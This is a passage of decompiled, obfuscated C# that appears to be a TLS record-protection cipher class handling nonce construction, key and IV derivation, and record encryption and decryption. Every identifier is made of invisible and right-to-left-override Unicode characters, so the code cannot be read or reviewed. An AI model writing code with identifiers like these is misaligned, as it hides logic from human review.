      throw new \u202B‬⁪⁮⁬⁮‫‏‫⁯‮⁬‫‬‍⁬⁮⁬‬‫‫⁮‎‎⁬​‍‎‍‏​⁯‍‬‫‍‫‮⁯‏‮((short) 80);
    return new \u206F⁯⁮‏‏⁯‌⁬‎‭‭⁬‏‮⁬⁪‫⁪‬‌⁪‎‭‪‌‎‎‎‍​‎‏‎‌‌‏⁭‫⁬‍‮(destinationArray, 0, destinationArray.Length, num3);
  }

  public virtual \u206A‏‫‬‎⁪⁯‫⁬‫‎⁯⁫⁭⁯​⁪⁫‫⁮‫⁪​⁮⁭‏‎​⁫‏‪‍⁮‬⁮⁭⁯‫⁯‫‮ \u206D⁫⁬⁪​⁪‏‌⁭‫‮‍‏⁫⁭⁬‪⁬⁮⁯⁬⁪‬‭⁭‬⁬‮‪⁫‮‏⁫‮⁭‬‎⁯‎‪‮(
    long _param1,
    short _param2,
    \u206E‫‮⁪‍⁯‬⁫⁫⁫‭⁭‏⁭‎​‮⁬⁪‫⁬‏‫‏⁬‏‏⁭‫‭⁮⁯‍‪‮⁫⁪‎‮‪‮ _param3,
    byte[] _param4,
    int _param5,
    int _param6)
  {
    if (this.\u206F‬⁭⁬‏⁪‏‪‏‌‬‪‬⁮‪⁭​‫‫‮⁪‪⁫‪‮‭⁯⁮‮‎‪‭⁯⁪⁫⁫‭‭‌⁪‮(_param6) < 0)
      throw new \u202B‬⁪⁮⁬⁮‫‏‫⁯‮⁬‫‬‍⁬⁮⁬‬‫‫⁮‎‎⁬​‍‎‍‏​⁯‍‬‫‍‫‮⁯‏‮((short) 50);
    byte[] destinationArray = new byte[this.\u202D⁯‎‭⁭⁭⁯​‭⁬⁪‍⁭‭⁯‏‮‏‫⁭⁯⁪‫‭​‫‌‮‍‮⁮‬⁯‌‫‪⁬​‌‬‮.Length + this.\u206F‬⁭⁬⁬‌⁯‮‌‎​⁮⁯⁭⁬‬‬⁭⁫⁪⁮⁭⁬​​‍⁯‎‬⁯‭‏‬‬‭​​‭‫‍‮];
    switch (this.\u206A‬‬​‭‏‪‪‬‭‭​⁬⁭⁪‎‍‫⁭⁮‎⁯⁫‪⁪⁬‭⁪⁭‪⁯⁭⁮‌‮‎‪‎‫‏‮)
    {
      case 1:
        Array.Copy((Array) this.\u202D⁯‎‭⁭⁭⁯​‭⁬⁪‍⁭‭⁯‏‮‏‫⁭⁯⁪‫‭​‫‌‮‍‮⁮‬⁯‌‫‪⁬​‌‬‮, 0, (Array) destinationArray, 0, this.\u202D⁯‎‭⁭⁭⁯​‭⁬⁪‍⁭‭⁯‏‮‏‫⁭⁯⁪‫‭​‫‌‮‍‮⁮‬⁯‌‫‪⁬​‌‬‮.Length);
        Array.Copy((Array) _param4, _param5, (Array) destinationArray, destinationArray.Length - this.\u206F‬⁭⁬⁬‌⁯‮‌‎​⁮⁯⁭⁬‬‬⁭⁫⁪⁮⁭⁬​​‍⁯‎‬⁯‭‏‬‬‭​​‭‫‍‮, this.\u206F‬⁭⁬⁬‌⁯‮‌‎​⁮⁯⁭⁬‬‬⁭⁫⁪⁮⁭⁬​​‍⁯‎‬⁯‭‏‬‬‭​​‭‫‍‮);
        break;
      case 2:
        \u202D⁯‎‌‬⁭⁬⁫‬⁫⁪​⁫⁪⁬​⁮‌‮‌⁮‏⁫‏‏‪‪⁬‍⁫‫‮⁫⁭‬⁭‌‮‭‏‮.\u200F⁪⁮‏‮‬‪‮‏⁭⁯‏‍‎⁮‫‏‪‭‌‌‪⁯‭⁪⁭⁪​‎‌‏‮‌‏‫​⁬‮⁮‍‮(_param1, destinationArray, destinationArray.Length - 8);
        for (int index = 0; index < this.\u202D⁯‎‭⁭⁭⁯​‭⁬⁪‍⁭‭⁯‏‮‏‫⁭⁯⁪‫‭​‫‌‮‍‮⁮‬⁯‌‫‪⁬​‌‬‮.Length; ++index)
          destinationArray[index] ^= this.\u202D⁯‎‭⁭⁭⁯​‭⁬⁪‍⁭‭⁯‏‮‏‫⁭⁯⁪‫‭​‫‌‮‍‮⁮‬⁯‌‫‪⁬​‌‬‮[index];
        break;
      default:
        throw new \u202B‬⁪⁮⁬⁮‫‏‫⁯‮⁬‫‬‍⁬⁮⁬‬‫‫⁮‎‎⁬​‍‎‍‏​⁯‍‬‫‍‫‮⁯‏‮((short) 80);
    }
    int num1 = _param5 + this.\u206F‬⁭⁬⁬‌⁯‮‌‎​⁮⁯⁭⁬‬‬⁭⁫⁪⁮⁭⁬​​‍⁯‎‬⁯‭‏‬‬‭​​‭‫‍‮;
    int num2 = _param6 - this.\u206F‬⁭⁬⁬‌⁯‮‌‎​⁮⁯⁭⁬‬‬⁭⁫⁪⁮⁭⁬​​‍⁯‎‬⁯‭‏‬‬‭​​‭‫‍‮;
    int num3 = this.\u202A‏‮‎⁯‏‫‮‫‍‌‭⁯⁫‮‍⁪‍⁫⁯⁬‌‏‪⁪‬⁭‬‭‮‮⁬‭​‭⁭⁭⁯⁪⁪‮.\u200E‍‮‎‎‎​‫⁫‍‮‭‫⁬⁭⁪​‮⁭‫⁫‌⁫⁯‮‪⁪‭⁭‬‎​⁪‎‪‫⁯‭‌⁫‮(num2);
    byte[] numArray = this.\u200C‏‎⁮⁪⁭‮⁭⁪‍‎‏‎‮‎⁮‭‌‎‬⁮​⁯‮‪⁫‎‬⁮‫⁬‌⁫‫⁪⁮‎‏‌‭‮(_param1, _param2, _param3, _param6, num3);
    int num4;
    try
    {
      this.\u202A‏‮‎⁯‏‫‮‫‍‌‭⁯⁫‮‍⁪‍⁫⁯⁬‌‏‪⁪‬⁭‬‭‮‮⁬‭​‭⁭⁭⁯⁪⁪‮.\u206A⁭⁫‪‫‬⁪‎​⁯‎‪⁬⁭​‍⁪⁫‌⁪‫⁯​⁪⁫⁫‪‬⁬‏‫‮⁬‬⁭⁬⁫‍⁮‮(destinationArray, this.\u206E⁪‌⁫‫‭‫‍‬⁪‍⁪‌⁯⁫⁪‭​‍‪‬⁪‍⁮⁬‫‫‌‮‬⁬⁯‫⁫⁮‭‍⁫​‬‮, numArray);
      num4 = this.\u202A‏‮‎⁯‏‫‮‫‍‌‭⁯⁫‮‍⁪‍⁫⁯⁬‌‏‪⁪‬⁭‬‭‮‮⁬‭​‭⁭⁭⁯⁪⁪‮.\u200F‏‏‬‫​⁮‬⁫‌‌⁮⁬‏⁭‭‌⁯⁪​‍​⁮⁫‮‫⁮‌‎‪⁬⁯⁪‪⁬‫⁫⁮‪⁭‮(_param4, num1, num2, _param4, num1);
    }
    catch (IOException ex)
    {
      throw ex;
    }
    catch (Exception ex)
    {
      throw new \u202B‬⁪⁮⁬⁮‫‏‫⁯‮⁬‫‬‍⁬⁮⁬‬‫‫⁮‎‎⁬​‍‎‍‏​⁯‍‬‫‍‫‮⁯‏‮((short) 20, ex);
    }
    if (num4 != num3)
      throw new \u202B‬⁪⁮⁬⁮‫‏‫⁯‮⁬‫‬‍⁬⁮⁬‬‫‫⁮‎‎⁬​‍‎‍‏​⁯‍‬‫‍‫‮⁯‏‮((short) 80);
    short num5 = _param2;
    if (this.\u202E⁫​‭‎⁪⁫‭⁫⁭⁮⁪‏‌⁮⁯⁪⁭⁮​⁬⁭⁭⁫‪⁮​‫⁬⁭⁯⁭‏‬⁯‪⁫‮‍⁪‮)
    {
      int num6 = num3;
      while (--num6 >= 0)
      {
        byte num7 = _param4[num1 + num6];
        if (num7 != (byte) 0)
        {
          num5 = (short) ((int) num7 & (int) byte.MaxValue);
          num3 = num6;
          goto label_20;
        }
      }
      throw new \u202B‬⁪⁮⁬⁮‫‏‫⁯‮⁬‫‬‍⁬⁮⁬‬‫‫⁮‎‎⁬​‍‎‍‏​⁯‍‬‫‍‫‮⁯‏‮((short) 10);
    }
label_20:
    return new \u206A‏‫‬‎⁪⁯‫⁬‫‎⁯⁫⁭⁯​⁪⁫‫⁮‫⁪​⁮⁭‏‎​⁫‏‪‍⁮‬⁮⁭⁯‫⁯‫‮(_param4, num1, num3, num5);
  }

  public virtual void \u202A⁮‏‌‫‌⁬⁪​‭‏⁮‪⁬‫⁮⁫‏⁯​‎⁫‪​‫‏⁫​‍⁮⁯​‭⁬‮‭‍‬‌‬‮() => this.\u202B⁮⁮⁭‌⁫⁯‮​⁫⁯‎⁮⁭‭⁬⁮⁬‏‎‎‏‌‫‮‏‬‪‌⁭‬‍⁭‌‌‮‮‌‮⁯‮(this.\u206E‮‎‭‭‭‏‮‪‬⁮⁯‪‌‬‎​‮‬⁭‮⁭‍‍⁯‬‪‍‫⁭⁫‭⁯‌‏⁬​‎‍‫‮.\u206B‮‍⁯⁬‪⁭‬‏​‍⁯⁪‌‬​⁮‬⁪⁬‌‬​‮‫⁭⁫‎⁪‪⁭‏‬⁪‍⁬‪⁬‮⁮‮, this.\u202A‏‮‎⁯‏‫‮‫‍‌‭⁯⁫‮‍⁪‍⁫⁯⁬‌‏‪⁪‬⁭‬‭‮‮⁬‭​‭⁭⁭⁯⁪⁪‮, this.\u202D⁯‎‭⁭⁭⁯​‭⁬⁪‍⁭‭⁯‏‮‏‫⁭⁯⁪‫‭​‫‌‮‍‮⁮‬⁯‌‫‪⁬​‌‬‮, !this.\u206E‮‎‭‭‭‏‮‪‬⁮⁯‪‌‬‎​‮‬⁭‮⁭‍‍⁯‬‪‍‫⁭⁫‭⁯‌‏⁬​‎‍‫‮.\u206A⁭⁫‫⁪‫​⁫‮⁯⁮⁫‫​⁭⁯⁬⁮​‭​‪‮‎⁮‫‌​‏‮‎‬⁫‮‪⁫‌⁮‬‬‮);

  public virtual void \u200B​⁪⁮⁭⁪⁮⁭⁪‬‪‏⁮​‭‬‮⁯‬⁮‮⁬⁪‬‫‎‮‭‮​⁭⁪‌⁯⁪‬⁫‏‍⁬‮() => this.\u202B⁮⁮⁭‌⁫⁯‮​⁫⁯‎⁮⁭‭⁬⁮⁬‏‎‎‏‌‫‮‏‬‪‌⁭‬‍⁭‌‌‮‮‌‮⁯‮(this.\u206E‮‎‭‭‭‏‮‪‬⁮⁯‪‌‬‎​‮‬⁭‮⁭‍‍⁯‬‪‍‫⁭⁫‭⁯‌‏⁬​‎‍‫‮.\u206B‮‍⁯⁬‪⁭‬‏​‍⁯⁪‌‬​⁮‬⁪⁬‌‬​‮‫⁭⁫‎⁪‪⁭‏‬⁪‍⁬‪⁬‮⁮‮, this.\u200C‌⁮⁯⁫⁪‭⁭‮‮‌‌⁮‪⁭‮​⁭‌‭‌⁯‌‫‏‪‏⁯​⁮‮‌⁫‫‫⁮⁯‎⁮⁫‮, this.\u200C⁫‍‮‪‮‭‮​‭‮‌‮‎⁭‪‌‌⁮‎‌⁫‬‮‍‏‏‏‭⁮‍‪‫‭⁭⁬‪⁬⁬⁭‮, this.\u206E‮‎‭‭‭‏‮‪‬⁮⁯‪‌‬‎​‮‬⁭‮⁭‍‍⁯‬‪‍‫⁭⁫‭⁯‌‏⁬​‎‍‫‮.\u206A⁭⁫‫⁪‫​⁫‮⁯⁮⁫‫​⁭⁯⁬⁮​‭​‪‮‎⁮‫‌​‏‮‎‬⁫‮‪⁫‌⁮‬‬‮);

  public virtual bool \u200C‮​⁬‍‍‬‏⁬‌⁯​‌‍‌‌‏⁮‎⁭‏‍⁪⁪‬‍⁬‮‍⁮‎⁯⁭‏‭‪⁯⁬‏⁬‮ => this.\u202E⁫​‭‎⁪⁫‭⁫⁭⁮⁪‏‌⁮⁯⁪⁭⁮​⁬⁭⁭⁫‪⁮​‫⁬⁭⁯⁭‏‬⁯‪⁫‮‍⁪‮;

  protected virtual byte[] \u200C‏‎⁮⁪⁭‮⁭⁪‍‎‏‎‮‎⁮‭‌‎‬⁮​⁯‮‪⁫‎‬⁮‫⁬‌⁫‫⁪⁮‎‏‌‭‮(
    long _param1,
    short _param2,
    \u206E‫‮⁪‍⁯‬⁫⁫⁫‭⁭‏⁭‎​‮⁬⁪‫⁬‏‫‏⁬‏‏⁭‫‭⁮⁯‍‪‮⁫⁪‎‮‪‮ _param3,
    int _param4,
    int _param5)
  {
    if (this.\u202E⁫​‭‎⁪⁫‭⁫⁭⁮⁪‏‌⁮⁯⁪⁭⁮​⁬⁭⁭⁫‪⁮​‫⁬⁭⁯⁭‏‬⁯‪⁫‮‍⁪‮)
    {
      byte[] numArray = new byte[5];
      \u202D⁯‎‌‬⁭⁬⁫‬⁫⁪​⁫⁪⁬​⁮‌‮‌⁮‏⁫‏‏‪‪⁬‍⁫‫‮⁫⁭‬⁭‌‮‭‏‮.\u200C‭‬⁬⁭‮​⁫‏‬⁫‪‪‫‌‎⁫⁯⁯‫​⁫‍‮‪‏‬‎‍⁮‮‪⁪⁪​⁬‮⁪‮‫‮(_param2, numArray, 0);
      \u202D⁯‎‌‬⁭⁬⁫‬⁫⁪​⁫⁪⁬​⁮‌‮‌⁮‏⁫‏‏‪‪⁬‍⁫‫‮⁫⁭‬⁭‌‮‭‏‮.\u200F​‎‏⁮‎⁫‬⁪⁪⁫⁭⁭⁪‌⁫⁭‭​⁪‬‬⁪⁪⁪‪⁭⁬⁫⁬‎‭‭‏‬⁬‫⁪​‬‮(_param3, numArray, 1);
      \u202D⁯‎‌‬⁭⁬⁫‬⁫⁪​⁫⁪⁬​⁮‌‮‌⁮‏⁫‏‏‪‪⁬‍⁫‫‮⁫⁭‬⁭‌‮‭‏‮.\u200D‫‫‏​​⁮‏‪⁫​⁫⁪⁯⁭‏‏⁫‭⁮⁮⁬‮‮⁪‭‭‪⁭‬‎‫‬‎‎⁪‫‫⁯‫‮(_param4, numArray, 3);
      return numArray;
    }
    byte[] numArray1 = new byte[13];
    \u202D⁯‎‌‬⁭⁬⁫‬⁫⁪​⁫⁪⁬​⁮‌‮‌⁮‏⁫‏‏‪‪⁬‍⁫‫‮⁫⁭‬⁭‌‮‭‏‮.\u200F⁪⁮‏‮‬‪‮‏⁭⁯‏‍‎⁮‫‏‪‭‌‌‪⁯‭⁪⁭⁪​‎‌‏‮‌‏‫​⁬‮⁮‍‮(_param1, numArray1, 0);
    \u202D⁯‎‌‬⁭⁬⁫‬⁫⁪​⁫⁪⁬​⁮‌‮‌⁮‏⁫‏‏‪‪⁬‍⁫‫‮⁫⁭‬⁭‌‮‭‏‮.\u200C‭‬⁬⁭‮​⁫‏‬⁫‪‪‫‌‎⁫⁯⁯‫​⁫‍‮‪‏‬‎‍⁮‮‪⁪⁪​⁬‮⁪‮‫‮(_param2, numArray1, 8);
    \u202D⁯‎‌‬⁭⁬⁫‬⁫⁪​⁫⁪⁬​⁮‌‮‌⁮‏⁫‏‏‪‪⁬‍⁫‫‮⁫⁭‬⁭‌‮‭‏‮.\u200F​‎‏⁮‎⁫‬⁪⁪⁫⁭⁭⁪‌⁫⁭‭​⁪‬‬⁪⁪⁪‪⁭⁬⁫⁬‎‭‭‏‬⁬‫⁪​‬‮(_param3, numArray1, 9);
    \u202D⁯‎‌‬⁭⁬⁫‬⁫⁪​⁫⁪⁬​⁮‌‮‌⁮‏⁫‏‏‪‪⁬‍⁫‫‮⁫⁭‬⁭‌‮‭‏‮.\u200D‫‫‏​​⁮‏‪⁫​⁫⁪⁯⁭‏‏⁫‭⁮⁮⁬‮‮⁪‭‭‪⁭‬‎‫‬‎‎⁪‫‫⁯‫‮(_param5, numArray1, 11);
    return numArray1;
  }

  protected virtual void \u202B⁮⁮⁭‌⁫⁯‮​⁫⁯‎⁮⁭‭⁬⁮⁬‏‎‎‏‌‫‮‏‬‪‌⁭‬‍⁭‌‌‮‮‌‮⁯‮(
    \u202E⁭‫‬‮⁪‮‍‌‎‎​⁪‏⁯‏⁯⁯‌‌​⁭⁫⁪‭‭‫⁯‫⁮‬​⁫⁪⁫⁮⁪⁭⁪‍‮ _param1,
    \u200E‪⁪⁪‍​⁬⁮‮⁪‫‬⁯⁮‫‍‫‪⁭‌⁭‬‎⁬⁭‏‪⁬⁫‮⁭​⁭‬⁬‫⁪‌‍⁯‮ _param2,
    byte[] _param3,
    bool _param4)
  {
    if (!this.\u202E⁫​‭‎⁪⁫‭⁫⁭⁮⁪‏‌⁮⁯⁪⁭⁮​⁬⁭⁭⁫‪⁮​‫⁬⁭⁯⁭‏‬⁯‪⁫‮‍⁪‮)
      throw new \u202B‬⁪⁮⁬⁮‫‏‫⁯‮⁬‫‬‍⁬⁮⁬‬‫‫⁮‎‎⁬​‍‎‍‏​⁯‍‬‫‍‫‮⁯‏‮((short) 80);
    this.\u206E⁭⁫⁪⁪‎‫⁪⁬‍‫‪‬‫⁬‭‬‌⁫⁮⁪⁯⁫⁮‬‏⁪‭⁫‎‬⁭‪​‍⁮‫⁫‮(_param2, _param3, (_param4 ? _param1.\u200F⁮‍⁫⁯⁫​‭‪‬​‌‬⁪‪​‪​⁫‭‭‮‍⁫‮⁬‏‫​⁪‬⁪‌‭​‎⁬‬​⁭‮ : _param1.\u202E‏‌⁯​‭‌‭‍‍‎‮⁭‌‭⁪⁮‏‏‏‍‎‮⁭​‍​⁪‌‪‪‮⁫‌​‭‭‫⁫‮) ?? throw new \u202B‬⁪⁮⁬⁮‫‏‫⁯‮⁬‫‬‍⁬⁮⁬‬‫‫⁮‎‎⁬​‍‎‍‏​⁯‍‬‫‍‫‮⁯‏‮((short) 80), _param1.\u200E‎⁬⁯‎‍⁭‌‌‪‎⁮‭‎‮‬‪‬‌‌‌‬​⁭⁪‌‭‭​‏‫‌​‍⁮‪‏‮‬‭‮);
  }

  protected virtual void \u206E⁭⁫⁪⁪‎‫⁪⁬‍‫‪‬‫⁬‭‬‌⁫⁮⁪⁯⁫⁮‬‏⁪‭⁫‎‬⁭‪​‍⁮‫⁫‮(
    \u200E‪⁪⁪‍​⁬⁮‮⁪‫‬⁯⁮‫‍‫‪⁭‌⁭‬‎⁬⁭‏‪⁬⁫‮⁭​⁭‬⁬‫⁪‌‍⁯‮ _param1,
    byte[] _param2,
    \u202E‍‫⁫⁮‏‮‏⁫‍‪⁬⁬‮‏⁮‬‫⁫‌‏‪⁯⁯‬‪⁬⁬‎⁫‌‪‬‎‪‏‌⁬⁫‪‮ _param3,
    int _param4)
  {
    byte[] numArray = \u202E⁬⁬‮‫‬⁬‍⁯⁭‭⁭‬⁭​‪‮⁭⁭⁬‫⁫‫⁭‪‮⁭⁬⁪‍‌‬⁮‬‫‎‍⁭​‍‮.\u202A‫⁪⁯⁪​‮⁪‎⁪⁮‌⁭⁯‌‬‫⁭‭⁪⁮‮‬‬⁮‮‎⁮‍​‍⁬​‎‍⁭‮‎⁮⁬‮(_param3, _param4, "key", \u202D⁯‎‌‬⁭⁬⁫‬⁫⁪​⁫⁪⁬​⁮‌‮‌⁮‏⁫‏‏‪‪⁬‍⁫‫‮⁫⁭‬⁭‌‮‭‏‮.\u202B⁫‌⁮⁫‎‬‮⁭‪⁬⁭‌⁯‏‬‮​‪‎⁫‍⁪‭‫​‌⁫⁫⁯‏⁫⁫⁭‌‫⁫‫‪‎‮, this.\u200C‌‬⁮⁪‍‭⁪⁮‎‭‪‍⁭‫‭⁬‬‍‫‮‮‌⁫‏‍⁪‬‪⁬⁭‫​⁬‫‎‍⁮‭⁭‮).\u202B‎⁪⁮⁫‍​⁫⁬‎⁭⁪‮‌​‬‎‫​⁫⁪⁭‏⁮​⁬‮‎⁫​‍‬‎⁪‏⁮⁪‪‮‬‮();
    byte[] sourceArray = \u202E⁬⁬‮‫‬⁬‍⁯⁭‭⁭‬⁭​‪‮⁭⁭⁬‫⁫‫⁭‪‮⁭⁬⁪‍‌‬⁮‬‫‎‍⁭​‍‮.\u202A‫⁪⁯⁪​‮⁪‎⁪⁮‌⁭⁯‌‬‫⁭‭⁪⁮‮‬‬⁮‮‎⁮‍​‍⁬​‎‍⁭‮‎⁮⁬‮(_param3, _param4, "iv", \u202D⁯‎‌‬⁭⁬⁫‬⁫⁪​⁫⁪⁬​⁮‌‮‌⁮‏⁫‏‏‪‪⁬‍⁫‫‮⁫⁭‬⁭‌‮‭‏‮.\u202B⁫‌⁮⁫‎‬‮⁭‪⁬⁭‌⁯‏‬‮​‪‎⁫‍⁪‭‫​‌⁫⁫⁯‏⁫⁫⁭‌‫⁫‫‪‎‮, this.\u206A‌⁫‫​‏‎‍‫⁯‏‌⁭‮‪‪⁯⁫⁯‮‪⁫‪⁪‭‎‌‭‎‏‏‫‎‪⁮⁭‮‏‏⁯‮).\u202B‎⁪⁮⁫‍​⁫⁬‎⁭⁪‮‌​‬‎‫​⁫⁪⁭‏⁮​⁬‮‎⁫​‍‬‎⁪‏⁮⁪‪‮‬‮();
    _param1.\u200E‬‫‬‬⁮‮⁬⁯⁪‭‎⁭‪‍‪‫⁫‭‮⁯​‏‍⁮‍‫‪⁪‮⁬⁫‬⁭⁮‮‫‭‪‮‮(numArray, 0, this.\u200C‌‬⁮⁪‍‭⁪⁮‎‭‪‍⁭‫‭⁬‬‍‫‮‮‌⁫‏‍⁪‬‪⁬⁭‫​⁬‫‎‍⁮‭⁭‮);
    Array.Copy((Array) sourceArray, 0, (Array) _param2, 0, this.\u206A‌⁫‫​‏‎‍‫⁯‏‌⁭‮‪‪⁯⁫⁯‮‪⁫‪⁪‭‎‌‭‎‏‏‫‎‪⁮⁭‮‏‏⁯‮);
    sourceArray[0] ^= (byte) 128;
    _param1.\u206A⁭⁫‪‫‬⁪‎​⁯‎‪⁬⁭​‍⁪⁫‌⁪‫⁯​⁪⁫⁫‪‬⁬‏‫‮⁬‬⁭⁬⁫‍⁮‮(sourceArray, this.\u206E⁪‌⁫‫‭‫‍‬⁪‍⁪‌⁯⁫⁪‭​‍‪‬⁪‍⁮⁬‫‫‌‮‬⁬⁯‫⁫⁮‭‍⁫​‬‮, (byte[]) null);
  }

  private static int \u200E⁯‬‏‍​‏‍⁮⁯‮⁫⁮‌‮⁮‭⁪‏⁯⁪‪‪⁭⁭‍⁮‎​‪⁭‏⁭⁮⁬‍⁯‎​‬‮(bool _param0, int _param1)
  {
    switch (_param1)
    {
      case 1:
      case 3:
        return !_param0 ? 1 : 2;
      case 2:
        return 2;
      default:
        throw new \u202B‬⁪⁮⁬⁮‫‏‫⁯‮⁬‫‬‍⁬⁮⁬‬‫‫⁮‎‎⁬​‍‎‍‏​⁯‍‬‫‍‫‮⁯‏‮((short) 80);
    }
  }
}
